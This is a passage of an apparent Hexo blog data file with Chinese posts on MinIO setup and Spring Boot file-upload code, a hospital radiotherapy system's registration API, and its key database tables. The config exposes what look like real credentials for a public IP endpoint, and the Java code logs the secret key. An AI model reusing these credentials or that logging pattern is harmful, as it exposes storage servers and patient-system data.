&lt;&#x2F;a&gt;\n          &lt;input  onchange&#x3D;&quot;doUpload()&quot; type&#x3D;&quot;file&quot; name&#x3D;&quot;file&quot; id&#x3D;&quot;inputImage&quot; accept&#x3D;&quot;image&#x2F;*&quot;&#x2F;&gt;\n      &lt;&#x2F;form&gt;\n       &lt;img  height&#x3D;&quot;120px&quot; style&#x3D;&quot;margin-left: 20px&quot; &gt;\n   &lt;&#x2F;div&gt;\n \n   &lt;script&gt;\n       let  doUpload&#x3D;()&#x3D;&gt;&#123;\n           console.log(&quot;1---&gt; start  upload &quot;);\n           let file &#x3D;  document.getElementById(&quot;inputImage&quot;).files[0];\n           if (&#x2F;^image\\&#x2F;\\w+$&#x2F;.test(file.type)) &#123;\n               let form &#x3D; document.getElementById(&quot;img-form&quot;);\n               let formData &#x3D; new FormData(form);\n               let oReq &#x3D; new XMLHttpRequest();\n               oReq.open(&quot;POST&quot;, &quot;http:&#x2F;&#x2F;127.0.0.1:9055&#x2F;uploadFile&quot;, true);\n               oReq.send(formData);\n               oReq.onload &#x3D; function(oEvent) &#123;\n                   if(oReq.status &#x3D;&#x3D; 200) &#123;\n                       alert(&quot;Uploaded Success&quot;);\n                       console.log(&quot;1---&gt; end  upload &quot;,oReq.response)\n                   &#125;\n               &#125;\n           &#125;\n       &#125;\n \n   &lt;&#x2F;script&gt;\n&lt;&#x2F;body&gt;\n&lt;&#x2F;html&gt;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"MinIO的搭建（单机部署）\"><a href=\"#MinIO的搭建（单机部署）\" class=\"headerlink\" title=\"MinIO的搭建（单机部署）\"></a>MinIO的搭建（单机部署）</h1><h2 id=\"二进制方式：\"><a href=\"#二进制方式：\" class=\"headerlink\" title=\"二进制方式：\"></a>二进制方式：</h2><pre class=\"line-numbers language-none\"><code class=\"language-none\">mkdir &#x2F;mnt&#x2F;data<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">sudo chmod -R 775 &#x2F;mnt&#x2F;data<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">wget -P &#x2F;mnt&#x2F;data&#x2F; https:&#x2F;&#x2F;dl.min.io&#x2F;server&#x2F;minio&#x2F;release&#x2F;linux-amd64&#x2F;minio<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p> 将下载的文件变成可执行</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">chmod +x &#x2F;mnt&#x2F;data&#x2F;minio<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>启动：         (不设置密码就是默认 minioadmin/minioadmin)</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">&#x2F;mnt&#x2F;data&#x2F;minio server &#x2F;mnt&#x2F;data<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>后台指定9000端口启动：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">nohup &#x2F;mnt&#x2F;data&#x2F;minio server  --address :9000 --console-address :9001 &#x2F;mnt&#x2F;data&#x2F; &gt; &#x2F;mnt&#x2F;data&#x2F;minio.log &amp;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<h2 id=\"docker方式：\"><a href=\"#docker方式：\" class=\"headerlink\" title=\"docker方式：\"></a>docker方式：</h2><pre class=\"line-numbers language-none\"><code class=\"language-none\">docker run -d \\\n  -p 8900:9000 \\\n  -p 8901:9001 \\\n  --name minio2 \\\n  -v ~&#x2F;var&#x2F;local&#x2F;environment&#x2F;data:&#x2F;data \\\n  -e &quot;MINIO_ROOT_USER&#x3D;root&quot; \\\n  -e &quot;MINIO_ROOT_PASSWORD&#x3D;minio123456&quot; \\\n  minio&#x2F;minio server &#x2F;data --console-address &quot;:8901&quot;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h1 id=\"spring-boot的整合\"><a href=\"#spring-boot的整合\" class=\"headerlink\" title=\"spring boot的整合\"></a>spring boot的整合</h1><p>pom加入minio依赖</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\"> &lt;dependency&gt;\n      &lt;groupId&gt;io.minio&lt;&#x2F;groupId&gt;\n      &lt;artifactId&gt;minio&lt;&#x2F;artifactId&gt;\n      &lt;version&gt;8.4.5&lt;&#x2F;version&gt;\n&lt;&#x2F;dependency&gt;\n \n&lt;dependency&gt;\n    &lt;groupId&gt;com.squareup.okhttp3&lt;&#x2F;groupId&gt;\n    &lt;artifactId&gt;okhttp&lt;&#x2F;artifactId&gt;\n    &lt;version&gt;4.10.0&lt;&#x2F;version&gt;\n&lt;&#x2F;dependency&gt;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>yml文件加入配置</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">minio:\n  endpoint: http:&#x2F;81.68.119.53&#x2F;:9000\n  accessKey: masterminio\n  secretKey: masterminio\n  bucketName: wmy<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>后端代码编写</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">@Configuration\n@Slf4j\npublic class MinioClientConfig &#123;\n \n    @Value(&quot;$&#123;minio.endpoint&#125;&quot;)\n    private String endpoint;\n \n    @Value(&quot;$&#123;minio.accessKey&#125;&quot;)\n    private String accessKey;\n \n    @Value(&quot;$&#123;minio.secretKey&#125;&quot;)\n    private String secretKey;\n \n    @Value(&quot;$&#123;minio.bucketName&#125;&quot;)\n    private String bucketName;\n \n    @Bean\n    public MinioClient minioClient() &#123;\n        log.info(&quot;endpoint&#x3D;&#123;&#125;  ,  accessKey&#x3D;&#123;&#125;  ,secretKey&#x3D;&#123;&#125;&quot;, endpoint, accessKey, secretKey);\n        return MinioClient.builder().credentials(accessKey, secretKey).endpoint(endpoint).build();\n    &#125;\n&#125;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>上传文件工具类</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">@Component\npublic class MinioUtils &#123;\n \n    @Autowired\n    private MinioClient minioClient;\n \n \n    &#x2F;**\n     * 判断桶是否存在\n     *&#x2F;\n    @SneakyThrows(Exception.class)\n    public boolean bucketExists(String bucketName) &#123;\n        return minioClient.bucketExists(BucketExistsArgs.builder().bucket(bucketName).build());\n    &#125;\n \n \n    &#x2F;**\n     * 创建桶\n     * @param bucketName\n     * 获取全部的桶  minioClient.listBuckets();\n     *&#x2F;\n    @SneakyThrows(Exception.class)\n    public void createBucket(String bucketName) &#123;\n        if (!minioClient.bucketExists(BucketExistsArgs.builder().bucket(bucketName).build())) &#123;\n            minioClient.makeBucket(MakeBucketArgs.builder().bucket(bucketName).build());\n        &#125;\n    &#125;\n \n \n    &#x2F;**\n     * 根据bucketName获取信息\n     * @param bucketName bucket名称\n     *&#x2F;\n    @SneakyThrows(Exception.class)\n    public Optional&lt;Bucket&gt; getBucket(String bucketName) &#123;\n        return minioClient.listBuckets().stream().filter(b -&gt; b.name().equals(bucketName)).findFirst();\n    &#125;\n \n    &#x2F;**\n     * 根据bucketName删除信息\n     * @param bucketName bucket名称\n     *&#x2F;\n    @SneakyThrows(Exception.class)\n    public  void removeBucket(String bucketName) &#123;\n        minioClient.removeBucket(RemoveBucketArgs.builder().bucket(bucketName).build());\n    &#125;\n \n    &#x2F;**\n     * 获取文件流\n     * @param bucketName bucket名称\n     * @param objectName 文件名称\n     * @return 二进制流\n     *&#x2F;\n    @SneakyThrows(Exception.class)\n    public InputStream getObject(String bucketName, String objectName) &#123;\n        return minioClient.getObject(GetObjectArgs.builder().bucket(bucketName).object(objectName).build());\n    &#125;\n \n \n    &#x2F;**\n     * 上传本地文件\n     * @param bucketName 存储桶\n     * @param objectName 对象名称\n     * @param fileName   本地文件路径\n     *&#x2F;\n    @SneakyThrows(Exception.class)\n    public  ObjectWriteResponse putObject(String bucketName, String objectName, String fileName) &#123;\n        if(!bucketExists(bucketName))&#123;\n           createBucket(bucketName);\n        &#125;\n        return minioClient.uploadObject(UploadObjectArgs.builder().bucket(bucketName).object(objectName).filename(fileName).build());\n    &#125;\n \n    &#x2F;**\n     * 通过流上传文件\n     * @param bucketName  存储桶\n     * @param objectName  文件对象\n     * @param inputStream 文件流\n     *&#x2F;\n    @SneakyThrows(Exception.class)\n    public  ObjectWriteResponse putObject(String bucketName, String objectName, InputStream inputStream) &#123;\n        if(!bucketExists(bucketName))&#123;\n            createBucket(bucketName);\n        &#125;\n        return minioClient.putObject(PutObjectArgs.builder().bucket(bucketName).object(objectName).stream(inputStream, inputStream.available(), -1).build());\n    &#125;\n \n \n    &#x2F;**\n     * 單個文件上傳遞\n     * @param bucketName\n     * @param multipartFile\n     * @return\n     *&#x2F;\n    @SneakyThrows(Exception.class)\n    public   String   uploadFileSingle(String  bucketName,MultipartFile multipartFile )  &#123;\n        if(!bucketExists(bucketName))&#123;\n            createBucket(bucketName);\n        &#125;\n        String fileName &#x3D; multipartFile.getOriginalFilename();\n        String[] split &#x3D; fileName.split(&quot;\\\\.&quot;);\n        if (split.length &gt; 1) &#123;\n            fileName &#x3D; split[0] + &quot;_&quot; + System.currentTimeMillis() + &quot;.&quot; + split[1];\n        &#125; else &#123;\n            fileName &#x3D; fileName + System.currentTimeMillis();\n        &#125;\n        InputStream in &#x3D; null;\n        try &#123;\n            in &#x3D; multipartFile.getInputStream();\n            minioClient.putObject(PutObjectArgs.builder().bucket(bucketName).object(fileName).stream(in, in.available(), -1).contentType(multipartFile.getContentType()).build());\n        &#125; catch (Exception e) &#123;\n            e.printStackTrace();\n        &#125; finally &#123;\n            if (in !&#x3D; null) &#123;\n                try &#123;\n                    in.close();\n                &#125; catch (IOException e) &#123;\n                    e.printStackTrace();\n                &#125;\n            &#125;\n        &#125;\n        return  getUploadObjectUrl(bucketName,fileName, 7*24*60*60);\n    &#125;\n \n \n    &#x2F;**\n     * description: 上传文件\n     * @param multipartFile\n     * @return: java.lang.String\n     *&#x2F;\n    public List&lt;String&gt; uploadFileBatch(String  bucketName,MultipartFile[] multipartFile) &#123;\n        if(!bucketExists(bucketName))&#123;\n            createBucket(bucketName);\n        &#125;\n        List&lt;String&gt; names &#x3D; new ArrayList&lt;&gt;();\n        for (MultipartFile file : multipartFile) &#123;\n            try &#123;\n                String fileName &#x3D; file.getOriginalFilename();\n                uploadFileSingle(bucketName,file);\n                names.add(fileName);\n            &#125;catch (Exception e)&#123;\n                e.printStackTrace();\n            &#125;\n        &#125;\n        return names;\n    &#125;\n \n \n    &#x2F;**\n     * 获取文件外链\n     * @param bucketName bucket名称\n     * @param objectName 文件名称\n     * @param expires    过期时间 &lt;&#x3D;7 秒级\n     * @return url\n     *&#x2F;\n    @SneakyThrows(Exception.class)\n    public  String getUploadObjectUrl(String bucketName, String objectName, Integer expires)  &#123;\n        return minioClient.getPresignedObjectUrl(GetPresignedObjectUrlArgs.builder().method(Method.PUT).bucket(bucketName).object(objectName).expiry(expires).build());\n    &#125;\n \n    &#x2F;**\n     * 下载文件\n     * bucketName:桶名\n     * @param fileName: 文件名\n     *&#x2F;\n    @SneakyThrows(Exception.class)\n    public  void download(String  bucketName,String fileName, HttpServletResponse response) &#123;\n        &#x2F;&#x2F; 获取对象的元数据\n        StatObjectResponse  stat &#x3D; minioClient.statObject(StatObjectArgs.builder().bucket(bucketName).object(fileName).build());\n        response.setContentType(stat.contentType());\n        response.setCharacterEncoding(&quot;UTF-8&quot;);\n        response.setHeader(&quot;Content-Disposition&quot;, &quot;attachment;filename&#x3D;&quot; + URLEncoder.encode(fileName, &quot;UTF-8&quot;));\n        InputStream is &#x3D; minioClient.getObject(GetObjectArgs.builder().bucket(bucketName).object(fileName).build());\n        IOUtils.copy(is, response.getOutputStream());\n        is.close();\n    &#125;\n \n&#125;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>上传接口开发</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">@SneakyThrows\n@PostMapping(&quot;&#x2F;uploadFile&quot;)\n@ResponseBody\npublic  String  uploadFile(@RequestParam(&quot;file&quot;)MultipartFile  multipartFile  )&#123;\n    log.info(&quot;uploadFile  ----   -----  start &quot;);\n    String imgPath &#x3D; minioUtils.uploadFileSingle(bucketName, multipartFile);\n    log.info(&quot;uploadFile  ----   -----  end &#123;&#125;&quot;,imgPath);\n    return   imgPath;\n&#125;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>前端代码编写</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">&lt;!DOCTYPE html&gt;\n&lt;html lang&#x3D;&quot;en&quot;&gt;\n&lt;head&gt;\n    &lt;meta charset&#x3D;&quot;UTF-8&quot;&gt;\n    &lt;title&gt;测试Minio上传文件&lt;&#x2F;title&gt;\n    &lt;style&gt;\n        a.upload-img &#123;\n            width: 165px;\n            display: inline-block;\n            margin-bottom: 10px;\n            text-align: center;\n            height: 37px;\n            line-height: 37px;\n            font-size: 14px;\n            color: #FFFFFF;\n            background-color: #f38e81;\n            border-radius: 3px;\n            text-decoration: none;\n            cursor: pointer;\n            border: 0px #fff solid;\n            box-shadow: 0px 0px 5px #B0B0B0;\n        &#125;\n    &lt;&#x2F;style&gt;\n&lt;&#x2F;head&gt;\n&lt;body&gt;\n \n   &lt;div style&#x3D;&quot;width: 100%;flex: auto&quot;&gt;\n      &lt;form id&#x3D;&quot;img-form&quot;&gt;\n          &lt;a href&#x3D;&quot;javascript:void(0)&quot; class&#x3D;&quot;upload-img&quot;&gt;&lt;label for&#x3D;&quot;inputImage&quot;&gt;上传图像&lt;&#x2F;label&gt; &lt;&#x2F;a&gt;\n          &lt;input  onchange&#x3D;&quot;doUpload()&quot; type&#x3D;&quot;file&quot; name&#x3D;&quot;file&quot; id&#x3D;&quot;inputImage&quot; accept&#x3D;&quot;image&#x2F;*&quot;&#x2F;&gt;\n      &lt;&#x2F;form&gt;\n       &lt;img  height&#x3D;&quot;120px&quot; style&#x3D;&quot;margin-left: 20px&quot; &gt;\n   &lt;&#x2F;div&gt;\n \n   &lt;script&gt;\n       let  doUpload&#x3D;()&#x3D;&gt;&#123;\n           console.log(&quot;1---&gt; start  upload &quot;);\n           let file &#x3D;  document.getElementById(&quot;inputImage&quot;).files[0];\n           if (&#x2F;^image\\&#x2F;\\w+$&#x2F;.test(file.type)) &#123;\n               let form &#x3D; document.getElementById(&quot;img-form&quot;);\n               let formData &#x3D; new FormData(form);\n               let oReq &#x3D; new XMLHttpRequest();\n               oReq.open(&quot;POST&quot;, &quot;http:&#x2F;&#x2F;127.0.0.1:9055&#x2F;uploadFile&quot;, true);\n               oReq.send(formData);\n               oReq.onload &#x3D; function(oEvent) &#123;\n                   if(oReq.status &#x3D;&#x3D; 200) &#123;\n                       alert(&quot;Uploaded Success&quot;);\n                       console.log(&quot;1---&gt; end  upload &quot;,oReq.response)\n                   &#125;\n               &#125;\n           &#125;\n       &#125;\n \n   &lt;&#x2F;script&gt;\n&lt;&#x2F;body&gt;\n&lt;&#x2F;html&gt;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n"},{"title":"pg集群","top":false,"cover":false,"toc":true,"mathjax":true,"date":"2023-03-06T00:44:30.000Z","password":"5c4aaf271c7c13b2372e84982f82f2cd279026950438dfc769c95dcabdfd2a87","summary":"pg集群","_content":"","source":"_posts/pg集群.md","raw":"---\ntitle: pg集群\ntop: false\ncover: false\ntoc: true\nmathjax: true\ndate: 2023-03-06 08:44:30\npassword: 5c4aaf271c7c13b2372e84982f82f2cd279026950438dfc769c95dcabdfd2a87\nsummary: pg集群\ntags: 集群\ncategories: db\n---\n","slug":"pg集群","published":1,"updated":"2023-03-10T02:54:02.906Z","_id":"clf0wz5vb0004pgvga1645hzk","comments":1,"layout":"post","photos":[],"link":"","content":"","site":{"data":{}},"excerpt":"","more":""},{"title":"第三方系统注册","top":false,"cover":false,"toc":true,"mathjax":true,"date":"2023-02-27T03:20:57.000Z","password":"5c4aaf271c7c13b2372e84982f82f2cd279026950438dfc769c95dcabdfd2a87","summary":"接口","_content":"\n## 三方系统注册访问服务\n\n> 请求路径\n\n| 路径 | 方法 |\n| :---------------------------------------------------------------------------------: | :-----------: |\n|http://10.1.0.9:8080/RTIS/infs/outh.ered?reqCode=registryService|POST|\n\n\n> 请求参数\n\n| 参数名 | 必填 | 类型 | 说明 |\n| :--------------: | :---------------: | :---------------: | :--------------------------------------: |\n| key | 是 | String | 认证key值，现场配发 |\n| userid | 是 | String | 用户id，医生账户 |\n| username | 是 | String | 用户名，医生姓名 |\n| type | 是 | String | 1.病人信息展示页面 2.病人治疗流程 |\n| id | 是 | String | 打开对应页面需要的病人治疗id或者治疗流程的检查id，当type=2的时候必填 |\n| clientid | 是 | String | 对应系统id |\n| idnum | 否 | String | 身份证号 |\n| hospno | 是 | String | 住院号 | \n| diagno | 是 | String | 门诊号 |\n| patientid | 是 | String | 就诊卡号\n\n\n","source":"_posts/第三方系统注册.md","raw":"---\ntitle: 第三方系统注册\ntop: false\ncover: false\ntoc: true\nmathjax: true\ndate: 2023-02-27 11:20:57\npassword: 5c4aaf271c7c13b2372e84982f82f2cd279026950438dfc769c95dcabdfd2a87\nsummary: 接口\ntags: interface\ncategories: ruiyun\n---\n\n## 三方系统注册访问服务\n\n> 请求路径\n\n| 路径 | 方法 |\n| :---------------------------------------------------------------------------------: | :-----------: |\n|http://10.1.0.9:8080/RTIS/infs/outh.ered?reqCode=registryService|POST|\n\n\n> 请求参数\n\n| 参数名 | 必填 | 类型 | 说明 |\n| :--------------: | :---------------: | :---------------: | :--------------------------------------: |\n| key | 是 | String | 认证key值，现场配发 |\n| userid | 是 | String | 用户id，医生账户 |\n| username | 是 | String | 用户名，医生姓名 |\n| type | 是 | String | 1.病人信息展示页面 2.病人治疗流程 |\n| id | 是 | String | 打开对应页面需要的病人治疗id或者治疗流程的检查id，当type=2的时候必填 |\n| clientid | 是 | String | 对应系统id |\n| idnum | 否 | String | 身份证号 |\n| hospno | 是 | String | 住院号 | \n| diagno | 是 | String | 门诊号 |\n| patientid | 是 | String | 就诊卡号\n\n\n","slug":"第三方系统注册","published":1,"updated":"2023-03-10T02:51:20.657Z","_id":"clf1y563o0003b8vg6snbaazw","comments":1,"layout":"post","photos":[],"link":"","content":"<h2 id=\"三方系统注册访问服务\"><a href=\"#三方系统注册访问服务\" class=\"headerlink\" title=\"三方系统注册访问服务\"></a>三方系统注册访问服务</h2><blockquote>\n<p>请求路径</p>\n</blockquote>\n<table>\n<thead>\n<tr>\n<th align=\"center\">路径</th>\n<th align=\"center\">方法</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"center\"><a href=\"http://10.1.0.9:8080/RTIS/infs/outh.ered?reqCode=registryService\">http://10.1.0.9:8080/RTIS/infs/outh.ered?reqCode=registryService</a></td>\n<td align=\"center\">POST</td>\n</tr>\n</tbody></table>\n<blockquote>\n<p>请求参数</p>\n</blockquote>\n<table>\n<thead>\n<tr>\n<th align=\"center\">参数名</th>\n<th align=\"center\">必填</th>\n<th align=\"center\">类型</th>\n<th align=\"center\">说明</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"center\">key</td>\n<td align=\"center\">是</td>\n<td align=\"center\">String</td>\n<td align=\"center\">认证key值，现场配发</td>\n</tr>\n<tr>\n<td align=\"center\">userid</td>\n<td align=\"center\">是</td>\n<td align=\"center\">String</td>\n<td align=\"center\">用户id，医生账户</td>\n</tr>\n<tr>\n<td align=\"center\">username</td>\n<td align=\"center\">是</td>\n<td align=\"center\">String</td>\n<td align=\"center\">用户名，医生姓名</td>\n</tr>\n<tr>\n<td align=\"center\">type</td>\n<td align=\"center\">是</td>\n<td align=\"center\">String</td>\n<td align=\"center\">1.病人信息展示页面 2.病人治疗流程</td>\n</tr>\n<tr>\n<td align=\"center\">id</td>\n<td align=\"center\">是</td>\n<td align=\"center\">String</td>\n<td align=\"center\">打开对应页面需要的病人治疗id或者治疗流程的检查id，当type=2的时候必填</td>\n</tr>\n<tr>\n<td align=\"center\">clientid</td>\n<td align=\"center\">是</td>\n<td align=\"center\">String</td>\n<td align=\"center\">对应系统id</td>\n</tr>\n<tr>\n<td align=\"center\">idnum</td>\n<td align=\"center\">否</td>\n<td align=\"center\">String</td>\n<td align=\"center\">身份证号</td>\n</tr>\n<tr>\n<td align=\"center\">hospno</td>\n<td align=\"center\">是</td>\n<td align=\"center\">String</td>\n<td align=\"center\">住院号</td>\n</tr>\n<tr>\n<td align=\"center\">diagno</td>\n<td align=\"center\">是</td>\n<td align=\"center\">String</td>\n<td align=\"center\">门诊号</td>\n</tr>\n<tr>\n<td align=\"center\">patientid</td>\n<td align=\"center\">是</td>\n<td align=\"center\">String</td>\n<td align=\"center\">就诊卡号</td>\n</tr>\n</tbody></table>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"三方系统注册访问服务\"><a href=\"#三方系统注册访问服务\" class=\"headerlink\" title=\"三方系统注册访问服务\"></a>三方系统注册访问服务</h2><blockquote>\n<p>请求路径</p>\n</blockquote>\n<table>\n<thead>\n<tr>\n<th align=\"center\">路径</th>\n<th align=\"center\">方法</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"center\"><a href=\"http://10.1.0.9:8080/RTIS/infs/outh.ered?reqCode=registryService\">http://10.1.0.9:8080/RTIS/infs/outh.ered?reqCode=registryService</a></td>\n<td align=\"center\">POST</td>\n</tr>\n</tbody></table>\n<blockquote>\n<p>请求参数</p>\n</blockquote>\n<table>\n<thead>\n<tr>\n<th align=\"center\">参数名</th>\n<th align=\"center\">必填</th>\n<th align=\"center\">类型</th>\n<th align=\"center\">说明</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"center\">key</td>\n<td align=\"center\">是</td>\n<td align=\"center\">String</td>\n<td align=\"center\">认证key值，现场配发</td>\n</tr>\n<tr>\n<td align=\"center\">userid</td>\n<td align=\"center\">是</td>\n<td align=\"center\">String</td>\n<td align=\"center\">用户id，医生账户</td>\n</tr>\n<tr>\n<td align=\"center\">username</td>\n<td align=\"center\">是</td>\n<td align=\"center\">String</td>\n<td align=\"center\">用户名，医生姓名</td>\n</tr>\n<tr>\n<td align=\"center\">type</td>\n<td align=\"center\">是</td>\n<td align=\"center\">String</td>\n<td align=\"center\">1.病人信息展示页面 2.病人治疗流程</td>\n</tr>\n<tr>\n<td align=\"center\">id</td>\n<td align=\"center\">是</td>\n<td align=\"center\">String</td>\n<td align=\"center\">打开对应页面需要的病人治疗id或者治疗流程的检查id，当type=2的时候必填</td>\n</tr>\n<tr>\n<td align=\"center\">clientid</td>\n<td align=\"center\">是</td>\n<td align=\"center\">String</td>\n<td align=\"center\">对应系统id</td>\n</tr>\n<tr>\n<td align=\"center\">idnum</td>\n<td align=\"center\">否</td>\n<td align=\"center\">String</td>\n<td align=\"center\">身份证号</td>\n</tr>\n<tr>\n<td align=\"center\">hospno</td>\n<td align=\"center\">是</td>\n<td align=\"center\">String</td>\n<td align=\"center\">住院号</td>\n</tr>\n<tr>\n<td align=\"center\">diagno</td>\n<td align=\"center\">是</td>\n<td align=\"center\">String</td>\n<td align=\"center\">门诊号</td>\n</tr>\n<tr>\n<td align=\"center\">patientid</td>\n<td align=\"center\">是</td>\n<td align=\"center\">String</td>\n<td align=\"center\">就诊卡号</td>\n</tr>\n</tbody></table>\n"},{"title":"重点数据库","top":false,"cover":false,"toc":true,"mathjax":true,"date":"2023-03-10T02:45:58.000Z","password":"5c4aaf271c7c13b2372e84982f82f2cd279026950438dfc769c95dcabdfd2a87","summary":"重点数据库","_content":"\n## onis运维重点数据库表\n\n```\nSELECT * from onis.opatient limit 5 -- 病人信息 \n\nSELECT * FROM onis.visit limit 5 -- 放疗疗程 \n\n在登记的时候会同时保存这两张表 \n\nSELECT * FROM onis.ostudy limit 5 -- 放射治疗检查（表单，一个ct申请就是一个治疗 一个精确治疗申请也是一个治疗） 自关联 \n\nSELECT * FROM onis.planfield2d LIMIT 5 -- 射野的信息\n\nSELECT * FROM onis.bookingmsg LIMIT 5  -- 预约信息 设备预约 每个格子都有记录 \n\nSELECT * FROM onis.signexecmsg LIMIT 5 -- 签字表，签到、治理记录信息\n\nSELECT * FROM onis.studyrecord LIMIT 5 -- 签字的流程表，签字按照这个流程来 \n\nSELECT * FROM onis.studyequipment LIMIT 5 -- 设备表 如定位机 ct定位机等 他们的信息都在这里面\n\nSELECT * FROM onis.studyflow LIMIT 5 -- 治疗单类型\n\nSELECT * FROM onis.moulddefmsg LIMIT 5 -- 治疗单模板\n\nSELECT * FROM onis.eacode LIMIT 5 -- 数据字典表\n\nSELECT * FROM onis.projectrelation LIMIT 5 -- 治疗单模板里设置的数据元\n\nSELECT * FROM onis.eaparam LIMIT 5 -- 系统相关的信息\n\nSELECT * FROM onis.view_visit LIMIT 5 -- 这个视图将opatient和visit表放在一起\n\nSELECT * FROM onis.view_studyvisit LIMIT 5 -- 这个视图将opatient和ostudy表放在一起,以治疗单为单位\n\n```\n","source":"_posts/重点数据库.md","raw":"---\ntitle: 重点数据库\ntop: false\ncover: false\ntoc: true\nmathjax: true\ndate: 2023-03-10 10:45:58\npassword: 5c4aaf271c7c13b2372e84982f82f2cd279026950438dfc769c95dcabdfd2a87\nsummary: 重点数据库\ntags: hot\ncategories: db\n---\n\n## onis运维重点数据库表\n\n```\nSELECT * from onis.opatient limit 5 -- 病人信息 \n\nSELECT * FROM onis.visit limit 5 -- 放疗疗程 \n\n在登记的时候会同时保存这两张表 \n\nSELECT * FROM onis.ostudy limit 5 -- 放射治疗检查（表单，一个ct申请就是一个治疗 一个精确治疗申请也是一个治疗） 自关联 \n\nSELECT * FROM onis.planfield2d LIMIT 5 -- 射野的信息\n\nSELECT * FROM onis.bookingmsg LIMIT 5  -- 预约信息 设备预约 每个格子都有记录 \n\nSELECT * FROM onis.signexecmsg LIMIT 5 -- 签字表，签到、治理记录信息\n\nSELECT * FROM onis.studyrecord LIMIT 5 -- 签字的流程表，签字按照这个流程来 \n\nSELECT * FROM onis.studyequipment LIMIT 5 -- 设备表 如定位机 ct定位机等 他们的信息都在这里面\n\nSELECT * FROM onis.studyflow LIMIT 5 -- 治疗单类型\n\nSELECT * FROM onis.moulddefmsg LIMIT 5 -- 治疗单模板\n\nSELECT * FROM onis.eacode LIMIT 5 -- 数据字典表\n\nSELECT * FROM onis.projectrelation LIMIT 5 -- 治疗单模板里设置的数据元\n\nSELECT * FROM onis.eaparam LIMIT 5 -- 系统相关的信息\n\nSELECT * FROM onis.view_visit LIMIT 5 -- 这个视图将opatient和visit表放在一起\n\nSELECT * FROM onis.view_studyvisit LIMIT 5 -- 